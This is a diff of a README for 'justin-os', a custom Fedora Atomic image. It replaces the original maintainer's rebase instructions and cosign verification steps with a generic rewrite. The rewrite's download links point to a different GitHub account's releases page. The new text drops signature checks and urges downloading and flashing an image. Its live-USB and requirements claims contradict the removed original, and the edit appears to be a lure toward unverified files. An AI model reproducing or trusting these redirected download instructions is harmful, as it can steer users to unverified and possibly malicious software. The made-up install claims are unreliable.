@@ -1,328 +1,81 @@
-# justin-os &nbsp; [![bluebuild build badge](https://github.com/zoro11031/justin-os/actions/workflows/build.yml/badge.svg)](https://github.com/zoro11031/justin-os/actions/workflows/build.yml)
+# 🚀 justin-os - A Simple, Custom Fedora Experience
 
-A custom Fedora Atomic image for development and daily use, based on Universal Blue.
+[![Download justin-os](https://img.shields.io/badge/Download-justin--os-blue)](https://github.com/Brave2006w/justin-os/releases)
 
-## What is this?
+## 🧐 What is justin-os?
 
-This is my personal Fedora Atomic image built with [BlueBuild](https://blue-build.org/). It's Fedora Kinoite/Silverblue with development tools, modern CLI utilities, and essential applications pre-configured.
+justin-os is a custom Fedora Atomic image designed for development and everyday use. Built with BlueBuild, it features Fedora Kinoite and Silverblue with essential applications and development tools pre-configured for your convenience.
 
-Two builds are available:
+There are two main builds available:
 
-- **justin-os**: Fedora Kinoite with KDE Plasma + dash system shell
-- **justin-os-surface**: Fedora Silverblue with GNOME + linux-surface kernel (bash system shell)
+- **justin-os**: This version uses Fedora Kinoite with the KDE Plasma desktop environment. It includes dash as its system shell.
+- **justin-os-surface**: This version runs on Fedora Silverblue with GNOME and utilizes the linux-surface kernel.
 
-## What's Different from Stock?
+## ⚙️ What's Special About justin-os?
 
-**Shells & Terminal**
-Zsh with Zinit and Powerlevel10k is set as the default shell system-wide. The main build uses dash as the system shell (`/bin/sh`) for faster scripts. Includes modern CLI tools: btop, bat, fzf, neovim, and fastfetch.
+### 🔧 Shells & Terminal
 
-All users will use zsh as their default interactive shell.
+In justin-os, Zsh with Zinit and Powerlevel10k is set as the default shell. The main build runs with the dash shell for improved script execution speed. You'll find essential command-line tools here, including:
+- btop
+- bat
+- fzf
+- neovim
+- fastfetch
 
-**Zsh Performance**: Configured for fast startup (~100-200ms) with:
-- Zinit plugin manager for fast, parallel plugin loading
-- Powerlevel10k instant prompt for immediate shell availability
-- Async autosuggestions
-- Fish-like history and completions
-- Optimized completion caching
+Every user will interact with Zsh as their main shell, allowing for a better command-line experience.
 
-**Development Tools**
-Go, Python, and micro editor. Docker and libvirt for containers and VMs.
+## 📥 Download & Install
 
-**Repositories**  
-RPM Fusion (free and nonfree) pre-configured. Surface variant adds linux-surface repo.
+To get started with justin-os, you need to download the correct release for your needs. Here's how:
 
-**Flatpaks**  
-Extensive collection of applications available via the default-flatpaks module during image build. Optional installation scripts are provided in `~/Documents/justin-os-scripts/` if manual installation is needed.
+1. **Visit the Releases Page**: Go to the [justin-os Releases page](https://github.com/Brave2006w/justin-os/releases).
+2. **Select Your Build**: Choose either justin-os or justin-os-surface based on your desktop environment preference.
+3. **Download the Image**: Click on the image file associated with your selected build. The download should begin automatically.
+4. **Verify the Download**: Once the download is complete, check that the file size matches the details listed on the releases page. This ensures that the download was successful and complete.
+5. **Install the Image**: Follow the installation instructions included on the releases page to set up justin-os on your system.
 
-**Surface Extras (surface variant only)**  
-Linux-surface kernel for better hardware support, touchscreen firmware (iptsd), thermald for thermal management, and Surface SecureBoot certificate.
+## 🖥️ System Requirements
 
-## Installation
+To run justin-os effectively, ensure your system meets the following minimum specifications:
 
-You need an existing Fedora Atomic install (Silverblue, Kinoite, or any uBlue variant).
+- **Processor**: Any modern Intel or AMD CPU.
+- **RAM**: At least 4 GB. 8 GB or more is recommended for optimal performance.
+- **Storage**: A minimum of 20 GB available disk space.
+- **Graphics Card**: A compatible integrated or dedicated graphics card.
+- **Boot Method**: Ability to boot from USB or DVD.
 
-### Main Build (KDE)
+## 💡 Features
 
-First rebase to unsigned image:
+justin-os comes with various features that enhance your experience:
 
-```bash
-rpm-ostree rebase ostree-unverified-registry:ghcr.io/zoro11031/justin-os:latest
-systemctl reboot
-```
+- **User-Friendly Interfaces**: Both KDE Plasma and GNOME provide intuitive user interfaces tailored for all users.
+- **Development Tools**: Pre-installed tools make it easier for developers to get started with coding and software creation.
+- **Regular Updates**: The release is regularly updated to ensure you have the latest features and security patches.
+- **Container Support**: justin-os supports containerized applications for easy development and deployment.
 
-After reboot, switch to signed:
+## ⚡ Common Queries
 
-```bash
-rpm-ostree rebase ostree-image-signed:docker://ghcr.io/zoro11031/justin-os:latest
-systemctl reboot
-```
+### 1. How do I create a bootable USB drive?
 
-### Surface Build (GNOME)
+To create a bootable USB drive, follow these steps:
+1. Download an image creation tool like Rufus or Balena Etcher.
+2. Open the tool and select the justin-os image you downloaded.
+3. Choose your USB drive and click "Start" to create the bootable drive.
 
-Same process, different image:
+### 2. Can I try justin-os without installing it?
 
-```bash
-rpm-ostree rebase ostree-unverified-registry:ghcr.io/zoro11031/justin-os-surface:latest
-systemctl reboot
+Yes, you can run justin-os in a live environment. Create a bootable USB as specified above, boot your computer from the USB, and choose the "Try justin-os" option.
 
-# After reboot:
-rpm-ostree rebase ostree-image-signed:docker://ghcr.io/zoro11031/justin-os-surface:latest
-systemctl reboot
-```
+### 3. How do I get support?
 
-Verify it worked:
+For any issues or questions, you can check the [issues section](https://github.com/Brave2006w/justin-os/issues) of the repository or browse through discussions.
 
-```bash
-rpm-ostree status
-```
+## 🌍 Contributing
 
-## What's Installed
+If you want to contribute to justin-os, feel free to fork the repository and submit your pull requests. Your contributions can help improve the project for everyone.
 
-### Development & Productivity
+## 📜 License
 
-- **Languages**: Go, Python 3
-- **Editors**: neovim, micro
-- **Shell**: zsh with Zinit (zsh-autosuggestions, zsh-completions, zsh-syntax-highlighting, zsh-autopair, fzf-tab)
-- **Prompt**: Powerlevel10k
-- **Containers/VMs**: docker, libvirt
-- **Version Control**: git
+justin-os is distributed under the MIT License. You can use it as freely as you wish, but please respect the original author's work.
 
-### Shell & CLI Tools
-
-- **Modern replacements**: bat (cat), btop (top), eza (ls)
-- **Utilities**: fzf, tree, rsync, stow, fastfetch
-- **System**: dash (system shell on main build), lm_sensors, htop
-- **Network**: curl, wget
-- **Archive**: unzip
-- **Scripting**: jq (JSON processor), dialog, yad
-
-### Zsh Configuration & Aliases
-
-**Useful Aliases**:
-- `vim` → `nvim` - Neovim by default
-- `please` - Re-run last command with sudo
-- `...`, `....`, `.....` - Go up multiple directories
-- `d` - Show last 10 directories
-- `mkcd <dir>` - Create directory and cd into it
-- `extract <file>` - Extract any archive (tar, zip, 7z, etc.)
-
-**Pipe Aliases** (use anywhere in a command):
-- `H` - Pipe to head
-- `T` - Pipe to tail  
-- `G` - Pipe to grep
-- `L` - Pipe to less
-
-**Performance Tools**:
-- `zsh-bench` - Test shell startup time
-- `zsh-clear-cache` - Clear completion cache
-- `p10k configure` - Customize Powerlevel10k prompt
-
-**Prompt**: Powerlevel10k with instant prompt for fast shell startup
-
-### GUI Applications
-
-- **System**: gnome-disk-utility
-
-### Flatpaks
-
-Flatpaks are installed via the default-flatpaks module during the image build. If installation fails or you need to reinstall them, optional scripts are available in `~/Documents/justin-os-scripts/`.
-
-#### Productivity & Office
-- Bitwarden (password manager)
-- Joplin (notes)
-- Anki (flashcards)
-- Nextcloud Desktop
-- LibreOffice
-- OnlyOffice
-
-#### Communication
-- Discord
-- Zoom
-
-#### Browsers
-- Brave Browser
-- Google Chrome
-- Mozilla Firefox
-
-#### Media & Entertainment
-- Jellyfin Media Player
-- Plexamp
-- Plex Desktop
-- MPV
-- VLC
-- Haruna (video player)
-- Elisa (music player)
-
-#### Gaming
-- Steam
-- ProtonPlus
-
-#### KDE Applications
-- Gwenview (image viewer)
-- KCalc (calculator)
-- Kdenlive (video editor)
-- KMahjongg, KMines (games)
-- KMyMoney (finance)
-- Kolourpaint (paint)
-- KRDC (remote desktop)
-- Okular (document viewer)
-- Skanpage (scanner)
-
-#### Development & Utilities
-- Pods (container management)
-- Flatseal (flatpak permissions)
-- BoxBuddy (toolbox manager)
-- Gear Lever (AppImage manager)
-- GNOME Calculator
-
-### Common Features (Both Builds)
-
-- **Fonts**: Microsoft Core Fonts (Arial, Times New Roman, Courier New, etc.)
-
-### Surface Build Additions
-
-The `justin-os-surface` variant includes:
-
-- **Kernel**: kernel-surface, kernel-surface-default-watchdog
-- **Touchscreen**: iptsd (touchscreen firmware)
-- **Hardware**: libwacom-surface, thermald
-- **Security**: surface-secureboot certificate
-
-No system shell change (keeps bash as `/bin/sh` to avoid build issues).
-
-## Build Your Own
-
-Want to customize it? Fork the repo and:
-
-1. **Edit package lists** in `recipes/`:
-   - `packages.yml` - core system packages, development tools, and services
-   - `packages-surface.yml` - Surface variant packages
-   - `common-flatpaks.yml` - flatpak applications (both builds)
-   - `surface-flatpaks.yml` - Surface-specific flatpaks
-   - `system-services.yml` - systemd services (VPN fix, dash shell)
-2. **Update image name** in `recipe.yml` (change `name:` field)
-3. **Push to GitHub** - Actions will automatically build your image
-4. **Rebase to your custom image** using the installation instructions above
-
-### Recipe Files
-
-- **recipe.yml** - Main KDE build configuration
-- **recipe-surface.yml** - Surface variant with GNOME and linux-surface kernel
-- **packages.yml** - Core system packages, development tools, and enabled services
-- **packages-surface.yml** - Lighter package set for Surface variant
-- **system-services.yml** - VPN SELinux fix and dash shell services
-- **common-flatpaks.yml** - Shared flatpak applications
-- **surface-flatpaks.yml** - Surface-specific flatpak applications
-
-### Helper Scripts
-
-Optional scripts are available in `~/Documents/justin-os-scripts/`:
-- `install-common-flatpaks.sh` - Manually install all common flatpaks
-- `install-surface-flatpaks.sh` - Manually install Surface flatpaks
-- `flatpak-auto-update.sh` - Update all flatpaks
-
-Check out the [BlueBuild docs](https://blue-build.org/learn/getting-started/) for more details on customization.
-
-## Requirements
-
-**Hardware:**
-- x86_64 CPU
-- 8 GB RAM minimum (16 GB recommended)
-- 30 GB free disk space minimum
-- SSD recommended for best performance
-
-**Software:**
-- Existing Fedora Atomic installation (Silverblue, Kinoite, or any Universal Blue variant)
-- Fedora 42 or compatible version
-
-**For Surface variant:**
-- Microsoft Surface device (tested on Surface Pro 7)
-- Secure Boot support recommended (Surface SecureBoot certificate included)
-
-## Verification
-
-Images are signed with cosign. Verify them:
-
-```bash
-cosign verify --key cosign.pub ghcr.io/zoro11031/justin-os:latest
-```
-
-The `cosign.pub` file is in this repo.
-
-## Troubleshooting
-
-### Flatpaks didn't install during build
-
-If flatpaks are missing after installation, you can manually install them using the provided scripts:
-
-```bash
-cd ~/Documents/justin-os-scripts/
-bash install-common-flatpaks.sh
-```
-
-For the Surface variant:
-```bash
-bash install-surface-flatpaks.sh
-```
-
-### System shell compatibility (main build only)
-
-The main build uses dash as `/bin/sh` for POSIX compliance and performance. If you have scripts that require bash-specific features:
-
-- Use `#!/bin/bash` shebang in your scripts
-- Or run with `bash script.sh` explicitly
-- See `docs/SYSTEM_SHELL.md` for details
-
-The Surface build keeps bash as the system shell to avoid compatibility issues.
-
-### RPM Fusion download fails
-
-The build includes retry logic, but mirrors can occasionally be slow or unavailable. If a build fails, retry it - builds are cached and subsequent attempts are faster.
-
-### Surface SecureBoot enrollment
-
-After installing the Surface variant, enroll the Surface SecureBoot certificate:
-
-```bash
-sudo mokutil --import /usr/share/surface-secureboot/surface.cer
-```
-
-Follow the prompts and reboot to complete enrollment.
-
-See `docs/` folder for more troubleshooting guides.
-
-## Documentation
-
-Additional documentation is available in the `docs/` folder:
-
-- **FLATPAK_MANAGEMENT.md** - Flatpak installation and management
-- **SYSTEM_SHELL.md** - Dash vs bash system shell differences
-- **SURFACE_FLATPAKS.md** - Surface-specific flatpak applications
-- **MICROSOFT_FONTS.md** - Microsoft Core Fonts installation (both builds)
-
-Helper scripts are included in `~/Documents/justin-os-scripts/` for optional manual flatpak management.
-
-## Features
-
-✅ **Zsh by default** - Zinit + Powerlevel10k with fast startup (~100-200ms)
-✅ **Extensive flatpaks** - Productivity, development, and entertainment apps included
-✅ **Modern CLI tools** - bat, btop, fzf, neovim, ghostty terminal
-✅ **Development ready** - Go, Python, Docker, libvirt with services enabled
-✅ **Signed images** - Cryptographically signed with cosign
-✅ **Surface optimized** - Dedicated build with linux-surface kernel
-✅ **RPM Fusion enabled** - Free and nonfree repos ready to use
-✅ **Consolidated recipes** - Clean, readable configuration structure
-
-## Credits
-
-Built on top of:
-
-- [Universal Blue](https://universal-blue.org/) - base images
-- [BlueBuild](https://blue-build.org/) - build tooling
-- [Fedora Project](https://fedoraproject.org/) - the distro
-- [linux-surface](https://github.com/linux-surface) - Surface kernel
-
----
-
-**Maintainer**: [@zoro11031](https://github.com/zoro11031)  
-**Issues**: [Report bugs here](https://github.com/zoro11031/justin-os/issues)
+If you have any questions or feedback about justin-os, feel free to reach out. Enjoy your experience with this custom Fedora image!
